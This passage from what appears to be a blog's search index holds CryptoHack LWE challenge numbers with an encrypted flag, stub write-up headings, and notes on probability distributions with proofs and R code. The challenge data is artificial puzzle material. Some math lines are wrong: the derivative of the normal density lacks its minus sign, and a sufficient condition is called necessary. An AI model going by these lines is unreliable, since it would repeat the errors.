220597335944113643138040910019263318251616203954548724660953303915089233301354511542662225751359573592406567125779, 460838912228809947843094986154780694841314087685379351551107763714127613789323858795003275958350186756130179585099, 140183105024444619512158726537661171898184380568070161231133567610679885584873426652521827961950911404383912561621, 100258312363732149931656549158547430770829888011033153048299126820116382987576385251423248018523377569893042593237, 405290867185420593972711092047858403431415058957648108848290712855486205273135789994549738296802436972506132007215, 256955277068974586752505570703153051582682851398012077625721880852140628262494489158976679841716540706155916871083, 598549159802958710401362839481280273681933957841944662088149512518476573000011803427513695903373248355980692446393, 308263288681016807641714404434630877489176754884164049322636274036076916608089721011418189274379096133290778967977, 8342859679410179631729508842147337278025979845268212054683951869690623917413242667876438120214556608223950514653, 439895086294728342454449126955941890844828534912064877350830376651948083146591737071488196253116258629344717466258, 91881226123407259536921548434174382841001791568169293198769940131230256611806601058471105885254628422499512141440, 377266324363766263400630205724731218877243980277025204567255708828742612895175112462476548764041808998472515741645, 116673062533491873681185131034931580572262852751033929144868000941380674942800523209276875356733463592351603448680, 57238242567269156027816815706946539463493497634492900168501163766058930300567388616552782194562204025116893421410, 589774086517371498643669747060802896861503240906569357013148621028285639980785543690656162836694887880501379427719, 299125626128142030020988742420785075132372751191528474146303145649473683269241675130370288768899920531289674244113, 304688395547666111898109663337992917557352968749730125549180444196974698222351897080702952045364871753888027443342, 482739851676824100473920409347215848398789318900117561465297399614115666738614477259195415015272146741220074932513, 223546862652113236935862556158177901803806229739994958195958127700830125319767534179348037800919714328649801362322, 150425375689725206871177727482717625428944121456212788472446922564113718518867636855506280578641904259888006038685, 143374483079122348274771015162872747263883105211675941440480524305910827744168931572051691220561136775398957657059, 128633351158033453796356108560970241527889904619011394383277988372280437398843373552825146090070247278923404428730, 249625701621261544438183108711205773478938560640571200325127252485779481701078452759513943692466279038851599018511, 330098489762871879773681019559732262466172018773272582308614672671671001199307865518506835519360693927579848132122, 97272570979206528424127336981516817168566955222510512261839537633559389914877185855268875504270285494647179225542, 74718841026645027941391238796126141775030441881552798010185595153873780524478674202965665888738730228577064111032, 59009205910055868684561742529451214311094377006520731342399475542159755492342086349692903126315766192176134558364, 147954106872023713951463145691216475084430006306060416221364896834795769425749212897622105818492094458111589403860, 555992830271936179812799550002813412539390844307434015514327261249472823762801208645240806724751727789206958497458, 459223438688559571249116685914649450095540121668933258507609746609794374539448063463326591749261191192370815662117, 571393209200912648822312183637054598815269397678580613768957089116765483865121162495918269935152288322187647411253, 177286186824084038346767370297094817293812392957721642873053028629715330336525966361030541938870465423944241324109, 587491267113142201933590855412985429253948652679543672927232780837039223665539177593879438262959884768626979925026, 121073719992748558849282996502703446279240313956823650619682240860630373634948798695523514085879310433388769297911, 326992821821879354165502695961028240084978294787383957718963930070776372845305415470613976088436935751047043512627, 55897462658973985554837453480984923331777372313619418297379632868358904708526448610515770876401568010074036247, 474281517111080897542557845865286041097457650249727914745876496139882777461227076272058949306156001543709356614827, 40880447006931568560802817837347288973549001731224760995212446282117046967004745589464560120352241602331262757637, 199377582253379978414081552664345738394226248383486423477706857549702059554694037264958719644482986837756496613246, 67583806809325529684782118654476643411516600285151896093983454855502714712133346956141976654071062935812737453191, 452546341988439193982297214011678766258506490290911066090290647614068455151806621409756646430532117713333419814200, 63154079944843452528208874183624055953361990336542165468695871390964383215223885775202331596927466794955939855669, 334551033942583568474606741839213957101383590286251155186668543235920975897931743928357631453433934808796703330473, 437000125133660712403788025992205090698484430907657894066272071296035483375078474260228687865444802416063967634962, 79996507523856267942889507576300340014719316733731500178081582238768493408405645914333660158893963260211116177267, 136957270824318341027124989034235585855646981093281453761145461440890955503793684517186875995202144027265329969201, 280204753198588906275980318398478729285287961542920285529979812275266316580102545873587416433404212703776245726478, 537734235993878341769434982550042490365981751251428660237179942734374485415922424357453321846937022328664895920607, 498357256878949571854248804622370932859926894994690120526235824883083753765132401863605500892090016764206939698756, 593183658694608014094449104249771865876595121367209656250471158771632486392533730913932393504513988512194994235126, 471525047958971655208534107052287853913949987926476676197514310320411235020283503103705707957701802098089852040455, 515550195522086342769232739520750768345601850976320014312405876943691700378141377151414091085616391824613041356222, 229784654767967355149909497709811119368560654037206880944035229827691011815016913131119422451043820980926353941725, 217169654015051285238559403576147518221573574303291047729813710960725792892550445720464605476174663800328177597453, 445865555254101127829958642102675927687168710569707725467286103803938348116926832834254624089519482737855028080263, 83946997792088073746354410376458121354546477090285151121896293987266118404260723878401677521317330022928683440101, 472119354862263268431251633432424976904384210603399093568806291862332048310282050100842204125396472101319620313029, 46843467515693389983627938872598324284244171067988563260495985345821466093790361374194115630948136965603015643581, 277302589126799360982750111603442360555051934636756171066424884732490616874962892980005637968336486277371298105284, 37796860324947087933757452089444569583341754367174335457777874936449439863762482510080776848131952814291888228252, 329201662631483519275850208043421059140347420462580260818216051307977255139454956805683010032538225008290753339066, 410958260744814455637908317160979333881545314073457621559204623145344687279791103290567233048673594441768330391568, 391184069150039601440639067557184862816991051523817132396666190555512106382919904848895224325098711230221328168893, 341778180155955688649827271577690269253924367106359453768062062983194302766144996692233530585116870343939549344048, 482885184891891026832543019680624112333051960746415331234199075553060933581630480706330420552017650892318225421994, 227417029879602291913898154454350465334192275455983368980997243946371067766121862949125088496933933053493304375082, 131891059077173823480681683274809296700667012054595015489329798567668841455882278540434006611778254351469315756836, 103977685400575936876007245351080422734569291709540152622222483086840011211808484758839889045266405362833100572217, 430039690420862864710328860317916251552162738538460131045295388990486621940999260820629946807283129550503791042360, 336054039341779369078755981618338727567421739252984379060088264565052065080902800664605952509539644185937023210384, 414650487301520195860820485747902373712957920758077572646321108690388934071745453432265035539090489903222596288408, 589576193361941267176015154197092338077060428665767302320550323024382985851379047593411265195718688560873123744185, 218382333622730104159935425552756841820388948639519923842495333910150980936866251625988964615764772159578862214025, 2542356543181698813075957157401385706512468063673241076844194782908937880847391489213422972872487843717747974071, 19012712934576590810330358701965194246607393288484627129050567402003333386833300009773236871643918870071025370112, 261459449945270346696260426170010104493420330959761424072408598127181246567262293489464049721489266230568086023687, 393057872763078249377870634042993942252544393136978340205701555086856991894130814830449765311294161681995357980571, 31706670785655144489258744219717253455873175486088498446357251628824725653898017817866303775262383346847940227722, 352845629675989592022318947558037109666715372268243939061740352176833050420783754677666411876876865226448815643420, 579523499570692157776642365278787278074363193157128877724940050501652213832135926670258239249988403301949338255538, 534781322034571849183222718240938369181782069830117215874801137890227720544463940037268498986061166881241864175911, 293947547828174245724554745263997068016996177889470503383528004805559670712802640725469343616840367100443153534752, 20256488447976344493484944853334005566670073013412177398480406734598723283264289836587474269370253077015786359305, 475307340957345844876811923970449788514706891727480716267956523131203845997503382023500463149439850432076379159007, 9532193777031501443256432870520743234491840911054244783623102207162388499144070592024440812057106927678514406207, 30376455906399256126534181227692885553266283699913099449205248506625206632827693466133644861846223565145288661633, 310323302397755654510284518631138079981439265632852684852876254116989091445393487579911757256043570018377230904180, 407387187512823516321154849212634322952876110252179375736935664859854509488826142049903683991617538259494461983206, 211765773488300500716796064525502573590145731868562963063378748592341237756767589777342751660513980880169703658019, 118119996850569812443799306306875048213209686043987665925365129711742300844060014347898233682054000714610165352429, 456288037921986114882644161559494182818651772335241262800783776696209877706906644069180867207555069937013686421247, 321798425169971169912343295962697085577508076571119888196289113181080013814133443673221049860354996979915353284172, 324976521789232911848337505841284978746361536915903971011255451438673522500730537005137182463678372897314198988595, 395621759076694189110473461483468243816716472466025836871653502259071450104902960119128530517955567830675053452079, 539300517585750216948117617165146582589224695990488749904551961039061424290129525221984586819908097960720708938354, 29279302128607422250205549520059282069518559284219582605487413142781822276106373289432262133635053599391124926385, 554047387889265384869858916477442181952403597250555948392949469296673941793381852004501421929101000148453680659392, 117780825424837288494479009381221759361151487239443821133102414888864152904732196195473813006762420646998382258677, 513764579681988270425418630365712613073908798769959690739998792846173650211508078458011456784363312999085649615413, 421686906289957894155024887354760839265000904451245772175308131137467275202489561700021659858819873604538650489994, 420037832423259525388141394520857134457021929872555809167052539034540217718781279113965175987358081438109891771580, 36451605745112040602804954235939462081346791770310181663631699054048414835838956409055640948581948016033003511333, 65866443469866248828119099994518897685990064406903627156894902667947376070679854260383038634727146436274230980496, 27676413701492447763964945205769602759768347623741189980278225943728587187940271050634054217590942659542302722334, 500312789935788689187812810985806111797362028998353677843819125485045576943472901976055579663665267905809820905862, 520064354401353505774803720281331074080600746212325401527048530022713769008774050816490541356142354757805595273068, 495854656037423684061417113244964481431602915324717605570975073575414392233479237472936965636133612283412033946051, 91739870792230359210043046401786959190045929124141709653873699398574077579395785555200462734509728806350612588545, 484531754577892922131892661653620989224382080321025512011181426678442547912964573223048519566085582623517825865418, 112714684344084391078866980839255594355187885339701715768009153551270432322826715969989728340963213693095849427668, 404429204723786534299525333122163342588586991421902466839808468487493896330979873416105908841447535426923681220957, 92404742424217640040375362532444172359091402942418950195520660310216430170054358290537973281349284862065214755739, 224043393969043013532511880223075809120842856165608086692928112430171548569493398551019081676395857489451126409940, 4305919427803364191555497499680058924116536587126751817219863902878291078989381194676206640960307162723876513248]Encrypted Flag: 45690752833299626276860565848930183308016946786375859806294346622745082512511847698896914843023558560509878243217521 解Learning With Errors 1LWE Background题 解1Oded Regev 论文链接：https://cims.nyu.edu/~regev/papers/lwesurvey.pdf LWE Intro题 解当没有noice了，我们就只需要解一个线性方程组：通过$A$以及$AS$的值求出$S$。 1Gaussian Elimination LWE High Bits Message题解LWE Low Bits Message题解From Private to Public Key LWE题解Learning With Errors 2","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/en/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/en/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"Lattices","slug":"Lattices","permalink":"https://archer-baiyi.github.io/en/tags/Lattices/"},{"name":"LWE(Learning With Error)","slug":"LWE-Learning-With-Error","permalink":"https://archer-baiyi.github.io/en/tags/LWE-Learning-With-Error/"}]},{"title":"Probability Distributions","slug":"TUM  数学 笔记/概率统计/Probability-Distributions","date":"2025-06-26T15:05:33.000Z","updated":"2025-11-29T16:05:49.514Z","comments":true,"path":"2025/06/26/TUM  数学 笔记/概率统计/Probability-Distributions/","permalink":"https://archer-baiyi.github.io/en/2025/06/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E7%BB%9F%E8%AE%A1/Probability-Distributions/","excerpt":"常见概率分部","text":"Normal Distribution参数: $\\mu$ (均值), $\\sigma^2$ (方差) Probability density function (PDF): f(x) = \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}}, \\quad -\\infty < x < \\inftyCumulative Distribution Function (CDF): 正态分布的CDF没有初等函数的封闭解析式。 F(x) = \\Phi\\left(\\frac{x-\\mu}{\\sigma}\\right) = \\int_{-\\infty}^{x} \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(t-\\mu)^2}{2\\sigma^2}} dtExpectation: E[X] = \\muVariance: \\text{Var}(X) = \\sigma^2Moments: E[(X-\\mu)^n] = \\begin{cases} 0 & \\text{if } n \\text{ is odd} \\\\ \\sigma^n (n-1)!! & \\text{if } n \\text{ is even} \\end{cases}$(n-1)!! = (n-1)(n-3)\\cdots 3 \\cdot 1$ 是双阶乘 Moment generating function: M_X(t) = e^{\\mu t + \\frac{1}{2}\\sigma^2 t^2}Definition:For $\\mu \\in \\mathbb{R}$ and $\\sigma &gt; 0$, we call a distribution with the density functionf(x) = \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}}, \\quad x \\in \\mathbb{R},the normal distribution $N(\\mu, \\sigma^2)$. For $\\mu = 0$ and $\\sigma^2 = 1$, this reduces to the densityf(x) = \\frac{1}{\\sqrt{2\\pi}} e^{-\\frac{x^2}{2}}, \\quad x \\in \\mathbb{R},of the standard normal distribution $N(0, 1)$. Theorem:For $\\mu \\in \\mathbb{R}$ and $\\sigma &gt; 0$, the functionf(x) = \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}}, \\quad x \\in \\mathbb{R},is indeed a density function. Proof: Using the substitution $y = \\frac{x - \\mu}{\\sigma}$, so that $dx = \\sigma \\, dy$, we have: \\int_{\\mathbb{R}} f(x) \\, dx = \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^\\infty e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}} \\, dx = \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^\\infty e^{-\\frac{y^2}{2}} \\, dy = \\frac{1}{\\sqrt{2\\pi}} \\cdot I,where I = \\int_{-\\infty}^\\infty e^{-\\frac{y^2}{2}} \\, dy.Note that this integral exists. Consider: I^2 = \\left( \\int_{-\\infty}^\\infty e^{-\\frac{x^2}{2}} \\, dx \\right) \\left( \\int_{-\\infty}^\\infty e^{-\\frac{y^2}{2}} \\, dy \\right) = \\int_{-\\infty}^\\infty \\int_{-\\infty}^\\infty e^{-\\frac{x^2 + y^2}{2}} \\, dx \\, dy.We switch to polar coordinates, i.e., we substitute x = r \\cos \\theta, \\quad y = r \\sin \\theta, \\quad r > 0, \\; \\theta \\in [0, 2\\pi).We compute the Jacobian determinant: \\left| \\frac{\\partial(x, y)}{\\partial(r, \\theta)} \\right| = \\left| \\begin{matrix} \\cos\\theta & -r \\sin\\theta \\\\ \\sin\\theta & r \\cos\\theta \\end{matrix} \\right| = r.So we obtain: I^2 = \\int_0^\\infty \\int_0^{2\\pi} e^{-\\frac{r^2}{2}} r \\, d\\theta \\, dr = 2\\pi \\int_0^\\infty r e^{-\\frac{r^2}{2}} \\, dr.Substitute $u = \\frac{r^2}{2}$, so that $du = r \\, dr$: 2\\pi \\int_0^\\infty e^{-u} \\, du = 2\\pi [-e^{-u}]_0^\\infty = 2\\pi.Hence, we conclude: I = \\sqrt{2\\pi}, \\quad \\text{and therefore} \\quad \\int_{\\mathbb{R}} f(x) \\, dx = 1.$\\square$ Theorem: Let $X \\sim N(\\mu,\\sigma^2)$ be a random variable, then\\mathbb{E}[X] = \\mu, \\quad Var(X) = \\sigma^2. Proof: Expectation: Substitute $z = \\frac{x - \\mu}{\\sigma} \\Rightarrow x = \\sigma z + \\mu$, and $dx = \\sigma dz$: \\begin{aligned} \\mathbb{E}[X] &= \\int_{-\\infty}^{\\infty} (\\sigma z + \\mu) \\cdot \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2} \\, dz \\\\ &= \\sigma \\frac{1}{\\sqrt{2\\pi}}\\int_{-\\infty}^{\\infty} z \\cdot e^{-z^2/2} \\, dz +\\mu \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} e^{-z^2/2} \\, dz \\\\ \\end{aligned}First notice that $z \\cdot e^{-z^2/2}$ is an odd function. Since \\int_{-\\infty}^{\\infty} |z e^{-z^2/2}| \\, dz = 2 \\int_0^{\\infty} z e^{-z^2/2} \\, dz = 2 \\cdot [-e^{-z^2/2}]_0^\\infty = 1,we have \\frac{\\sigma}{\\sqrt{2\\pi}}\\int_{-\\infty}^{\\infty} z \\cdot e^{-z^2/2} \\, dz = 0.(Do keep in mind: if $f$ is an odd function, then \\int_{\\infty}^{\\infty}|f(x)|dx < \\inftyis a necessary condition of $\\int_{\\infty}^{\\infty}f(x)dx = 0$ . Because otherwise, $f(x)=x$ is a simple counterexample.) Moreover, we have seen in the last proof that \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} e^{-z^2/2} \\, dz = 1.Therefore, \\mathbb{E}[X] = \\sigma \\cdot 0 + \\mu \\cdot 1 = \\mu.Variance: We compute: \\mathrm{Var}(X) = \\mathbb{E}[X^2] - (\\mathbb{E}[X])^2 = \\int_{-\\infty}^{\\infty} x^2 f(x) \\, dx - \\mu^2Again substitute $z = \\frac{x - \\mu}{\\sigma} \\Rightarrow x = \\sigma z + \\mu$, and $dx = \\sigma dz$: \\begin{aligned} \\int_{-\\infty}^{\\infty} x^2 f(x) \\, dx &= \\int_{-\\infty}^{\\infty} (\\sigma z + \\mu)^2 \\cdot \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2} \\, dz \\\\ &= \\int_{-\\infty}^{\\infty} (\\sigma^2 z^2 + 2\\sigma \\mu z + \\mu^2) \\cdot \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2} \\, dz \\\\ &= \\sigma^2 \\int z^2 \\phi(z) \\, dz + 2\\sigma\\mu \\int z \\phi(z) \\, dz + \\mu^2 \\int \\phi(z) \\, dz \\\\ &= \\sigma^2 \\cdot 1 + 2\\sigma\\mu \\cdot 0 + \\mu^2 \\cdot 1 \\\\ &= \\sigma^2 + \\mu^2 \\end{aligned},where \\phi(z) = \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2}.In addition, since $\\phi’(z) = z\\phi(z)$, \\begin{aligned} \\int_{-\\infty}^{\\infty} z^2 \\phi(z) \\, dz &= \\int_{-\\infty}^{\\infty} z \\cdot (-\\phi'(z)) \\, dz \\\\ &\\overset{\\text{integration by parts}}{=} [-z\\phi(z)]_{-\\infty}^{\\infty} + \\int_{-\\infty}^{\\infty} \\phi(z) \\, dz \\\\ &= 0+1 = 1. \\end{aligned}Finally, we have \\mathrm{Var}(X) = \\int_{-\\infty}^{\\infty} x^2 f(x) \\, dx - \\mu^2 = \\sigma^2 + \\mu^2 - \\mu^2 = \\sigma^2.$\\square$ Bernoulli Distribution 伯努利分布参数: $p$ (成功概率, $0 \\le p \\le 1$) Probability mass function (PMF): P(X=k) = p^k (1-p)^{1-k}, \\quad k \\in \\{0, 1\\}Cumulative Distribution Function (CDF): F(x) = \\begin{cases} 0 & x < 0 \\\\ 1-p & 0 \\le x < 1 \\\\ 1 & x \\ge 1 \\end{cases}Expectation: E[X] = pVariance: \\text{Var}(X) = p(1-p)Moments: E[X^n] = p \\quad (n \\ge 1)Moment generating function: M_X(t) = 1 - p + pe^tBinomial Distribution 二项分布参数: $n$ (试验次数), $p$ (成功概率) Probability mass function (PMF): P(X=k) = \\binom{n}{k} p^k (1-p)^{n-k}, \\quad k = 0, 1, \\dots, nCumulative Distribution Function (CDF): F(x) = \\sum_{i=0}^{\\lfloor x \\rfloor} \\binom{n}{i} p^i (1-p)^{n-i}Expectation: E[X] = npVariance: \\text{Var}(X) = np(1-p)Moments: E[X^2] = n(n-1)p^2 + npMoment generating function: M_X(t) = (1 - p + pe^t)^nPoisson Distribution 泊松分布参数: $\\lambda$ (单位时间/面积内的平均发生率, $\\lambda &gt; 0$) Probability mass function (PMF): P(X=k) = \\frac{\\lambda^k e^{-\\lambda}}{k!}, \\quad k = 0, 1, 2, \\dotsCumulative Distribution Function (CDF): F(x) = e^{-\\lambda} \\sum_{i=0}^{\\lfloor x \\rfloor} \\frac{\\lambda^i}{i!}Expectation: E[X] = \\lambdaVariance: \\text{Var}(X) = \\lambdaMoments: E[X^2] = \\lambda^2 + \\lambdaMoment generating function: M_X(t) = e^{\\lambda(e^t - 1)}Geometric Distribution 几何分布参数: $p$ (成功概率)。此处定义为第 $k$ 次试验首次成功 (Support: $1, 2, \\dots$) Probability mass function (PMF): P(X=k) = (1-p)^{k-1}p, \\quad k = 1, 2, \\dotsCumulative Distribution Function (CDF): F(x) = \\begin{cases} 0 & x < 1 \\\\ 1 - (1-p)^{\\lfloor x \\rfloor} & x \\ge 1 \\end{cases}Expectation: E[X] = \\frac{1}{p}Variance: \\text{Var}(X) = \\frac{1-p}{p^2}Moments: 涉及到多重对数函数，无简单的初等函数通项。通常使用递推公式： E[X^n] = \\frac{1}{p} \\sum_{k=0}^{n-1} \\binom{n}{k} E[X^k] (1-p) E[X^2] = \\frac{2-p}{p^2}Moment generating function: M_X(t) = \\frac{pe^t}{1 - (1-p)e^t}, \\quad \\text{for } t < -\\ln(1-p)Uniform Distribution 均匀分布参数: $a, b$ (区间端点, $a &lt; b$) Probability density function (PDF): f(x) = \\begin{cases} \\frac{1}{b-a} & a \\le x \\le b \\\\ 0 & \\text{otherwise} \\end{cases}Cumulative Distribution Function (CDF): F(x) = \\begin{cases} 0 & x < a \\\\ \\frac{x-a}{b-a} & a \\le x < b \\\\ 1 & x \\ge b \\end{cases}Expectation: E[X] = \\frac{a+b}{2}Variance: \\text{Var}(X) = \\frac{(b-a)^2}{12}Moments: E[X^n] = \\frac{b^{n+1} - a^{n+1}}{(n+1)(b-a)}Moment generating function: M_X(t) = \\frac{e^{tb} - e^{ta}}{t(b-a)}, \\quad t \\neq 0Exponential Distribution 指数分布参数: $\\lambda$ (率参数, $\\lambda &gt; 0$) Probability density function (PDF): f(x) = \\begin{cases} \\lambda e^{-\\lambda x} & x \\ge 0 \\\\ 0 & x < 0 \\end{cases}Cumulative Distribution Function (CDF): F(x) = \\begin{cases} 1 - e^{-\\lambda x} & x \\ge 0 \\\\ 0 & x < 0 \\end{cases}Expectation: E[X] = \\frac{1}{\\lambda}Variance: \\text{Var}(X) = \\frac{1}{\\lambda^2}Moments: E[X^n] = \\frac{n!}{\\lambda^n}Moment generating function: M_X(t) = \\frac{\\lambda}{\\lambda - t}, \\quad t < \\lambdaGamma Distribution 伽玛分布参数: $\\alpha$ (形状参数 shape), $\\beta$ (率参数 rate, sometimes $\\theta = 1/\\beta$ is used as scale) Probability density function (PDF): f(x) = \\frac{\\beta^\\alpha}{\\Gamma(\\alpha)} x^{\\alpha-1} e^{-\\beta x}, \\quad x > 0Cumulative Distribution Function (CDF): F(x) = \\frac{\\gamma(\\alpha, \\beta x)}{\\Gamma(\\alpha)}其中 $\\gamma(s, x) = \\int_0^x t^{s-1} e^{-t} dt$。 Expectation: E[X] = \\frac{\\alpha}{\\beta}Variance: \\text{Var}(X) = \\frac{\\alpha}{\\beta^2}Moments: E[X^n] = \\frac{\\Gamma(\\alpha+n)}{\\beta^n \\Gamma(\\alpha)} = \\frac{\\alpha(\\alpha+1)\\cdots(\\alpha+n-1)}{\\beta^n}Moment generating function: M_X(t) = \\left( \\frac{\\beta}{\\beta - t} \\right)^\\alpha, \\quad t < \\betaChi-Squared Distribution 卡方分布参数: $k$ (自由度 degrees of freedom, $k \\in \\mathbb{N}^*$) 卡方分布是伽玛分布的一个特例，其中$\\alpha = k/2$, $\\beta = 1/2$。 Probability density function (PDF): f(x) = \\frac{1}{2^{k/2}\\Gamma(k/2)} x^{k/2 - 1} e^{-x/2}, \\quad x > 0Cumulative Distribution Function (CDF): F(x) = \\frac{\\gamma(k/2, x/2)}{\\Gamma(k/2)} = P\\left(\\frac{k}{2}, \\frac{x}{2}\\right)其中 $\\gamma(s, x)$ 为下不完全伽玛函数，$P$ 为正则化伽玛函数。 Expectation: E[X] = kVariance: \\text{Var}(X) = 2kMoments: E[X^n] = 2^n \\frac{\\Gamma(k/2 + n)}{\\Gamma(k/2)} = \\prod_{i=0}^{n-1} (k+2i) = k(k+2)(k+4)\\cdots(k+2n-2)Moment generating function: M_X(t) = (1 - 2t)^{-k/2}, \\quad t < \\frac{1}{2}Beta Distribution 贝塔分布参数: $\\alpha, \\beta$ (形状参数 shape parameters, $\\alpha &gt; 0, \\beta &gt; 0$) Probability density function (PDF): f(x) = \\frac{1}{B(\\alpha, \\beta)} x^{\\alpha-1} (1-x)^{\\beta-1}, \\quad 0 < x < 1其中 $B(\\alpha, \\beta) = \\frac{\\Gamma(\\alpha)\\Gamma(\\beta)}{\\Gamma(\\alpha+\\beta)}$ 为贝塔函数。 Cumulative Distribution Function (CDF): F(x) = I_x(\\alpha, \\beta) = \\frac{B(x; \\alpha, \\beta)}{B(\\alpha, \\beta)}其中 $B(x; \\alpha, \\beta) = \\int_0^x t^{\\alpha-1}(1-t)^{\\beta-1} dt$ 为不完全贝塔函数 (Incomplete Beta Function)，$I_x$ 为正则化不完全贝塔函数。 Expectation: E[X] = \\frac{\\alpha}{\\alpha + \\beta}Variance: \\text{Var}(X) = \\frac{\\alpha\\beta}{(\\alpha+\\beta)^2(\\alpha+\\beta+1)}Moments: E[X^n] = \\frac{B(\\alpha+n, \\beta)}{B(\\alpha, \\beta)} = \\prod_{i=0}^{n-1} \\frac{\\alpha+i}{\\alpha+\\beta+i}Moment generating function: 无初等函数形式，通常表示为合流超几何函数 (Confluent Hypergeometric Function): M_X(t) = 1 + \\sum_{k=1}^\\infty \\left( \\prod_{r=0}^{k-1} \\frac{\\alpha+r}{\\alpha+\\beta+r} \\right) \\frac{t^k}{k!}R在 R 语言中，处理概率分布有一套非常标准的前缀命名规则。对于每种分布（比如 norm），都有 4 个核心函数： d (Density): 概率密度/质量函数 (PDF/PMF), e.g., dnorm p (Probability): 累积分布函数 (CDF), e.g., pnorm q (Quantile): 分位数函数 (CDF 的反函数), e.g., qnorm r (Random): 生成随机数, e.g., rnorm 一、离散型分布 (Discrete)1. Bernoulli &amp; Binomial (伯努利与二项分布)R 中没有专门的 bernoulli 函数，伯努利分布就是 size = 1 的二项分布。 123456789101112131415161718# 参数设定: n=10次试验, p=0.5成功率n &lt;- 10p &lt;- 0.5# 1. PMF (Density): 恰好成功 5 次的概率 P(X=5)dbinom(x = 5, size = n, prob = p)# 2. CDF (Probability): 成功次数 &lt;= 5 的概率 P(X&lt;=5)pbinom(q = 5, size = n, prob = p)# 3. Quantile: 累积概率达到 0.95 时的成功次数qbinom(p = 0.95, size = n, prob = p)# 4. Random: 模拟 5 组实验，每组试验 n 次rbinom(n = 5, size = n, prob = p)# 特例：伯努利分布 (size = 1)rbinom(n = 10, size = 1, prob = 0.5) # 生成 10 个 0 或 1 2. Poisson Distribution (泊松分布)1234567891011# 参数设定: lambda = 4lam &lt;- 4# 1. PMF: 发生 3 次的概率 P(X=3)dpois(x = 3, lambda = lam)# 2. CDF: 发生次数 &lt;= 3 的概率 P(X&lt;=3)ppois(q = 3, lambda = lam)# 3. Random: 生成 10 个符合泊松分布的随机数rpois(n = 10, lambda = lam) 3. Geometric Distribution (几何分布)R 中的几何分布定义为失败次数 ($X \\in \\{0, 1, \\dots\\}$)，直到第一次成功。 如果使用的是 $X \\in \\{1, 2, \\dots\\}$ (第 $k$ 次首次成功)，则 R 中的 x 应该是 k-1。 123456789101112# 参数: p = 0.2prob &lt;- 0.2# 1. PMF: 在第 5 次试验首次成功 (意味着前 4 次失败)# 公式: P(X=5 in math definition) -&gt; dgeom(4, p)dgeom(x = 4, prob = prob) # 2. CDF: 在第 5 次及以前成功的概率pgeom(q = 4, prob = prob)# 3. Random: 生成 10 个随机样本 (返回的是失败次数)rgeom(n = 10, prob = prob) 二、连续型分布 (Continuous)4. Uniform Distribution (均匀分布)123456789101112# 参数: 区间 [a, b] -&gt; min=0, max=10a &lt;- 0b &lt;- 10# 1. PDF: 在 x=5 处的密度 (对于均匀分布是常数 1/(b-a))dunif(x = 5, min = a, max = b)# 2. CDF: P(X &lt;= 5)punif(q = 5, min = a, max = b)# 3. Random: 生成 5 个 [0, 10] 之间的随机数runif(n = 5, min = a, max = b) 5. Exponential Distribution (指数分布)1234567891011# 参数: lambda (rate) = 0.5lam &lt;- 0.5# 1. PDF: f(x) at x=2dexp(x = 2, rate = lam)# 2. CDF: P(X &lt;= 2) = 1 - e^(-lambda * 2)pexp(q = 2, rate = lam)# 3. Random: 生成符合指数分布的随机数rexp(n = 5, rate = lam) 6. Normal Distribution (正态分布)注意：R 使用标准差 sd ($\\sigma$) 作为参数，而不是方差 ($\\sigma^2$)。 123456789101112131415# 参数: mean=0, sd=1 (标准正态)mu &lt;- 0sigma &lt;- 1# 1. PDF: f(x)dnorm(x = 1.96, mean = mu, sd = sigma)# 2. CDF: P(X &lt;= 1.96) ≈ 0.975pnorm(q = 1.96, mean = mu, sd = sigma)# 3. Quantile: 查表逆运算，P(X &lt;= z) = 0.975，求 zqnorm(p = 0.975, mean = mu, sd = sigma) # 结果约为 1.96# 4. Random: 生成正态分布数据rnorm(n = 10, mean = mu, sd = sigma) 7. Gamma Distribution (伽玛分布)R 支持 rate ($\\beta$) 或 scale ($1/\\beta$) 参数。 123456789101112# 参数: alpha (shape) = 2, beta (rate) = 0.5alpha &lt;- 2beta &lt;- 0.5# 1. PDF: f(x)dgamma(x = 4, shape = alpha, rate = beta)# 2. CDF: F(x)pgamma(q = 4, shape = alpha, rate = beta)# 3. Randomrgamma(n = 10, shape = alpha, rate = beta)","categories":[{"name":"TUM 数学 笔记","slug":"TUM-数学-笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"概率/统计 Probability & Statistics","slug":"TUM-数学-笔记/概率-统计-Probability-Statistics","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87-%E7%BB%9F%E8%AE%A1-Probability-Statistics/"}],"tags":[{"name":"概率论","slug":"概率论","permalink":"https://archer-baiyi.github.io/en/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/en/tags/Probability-Theory/"},{"name":"distribution","slug":"distribution","permalink":"https://archer-baiyi.github.io/en/tags/distribution/"}]},{"title":"CSCG 2025 Intro_to_pwn 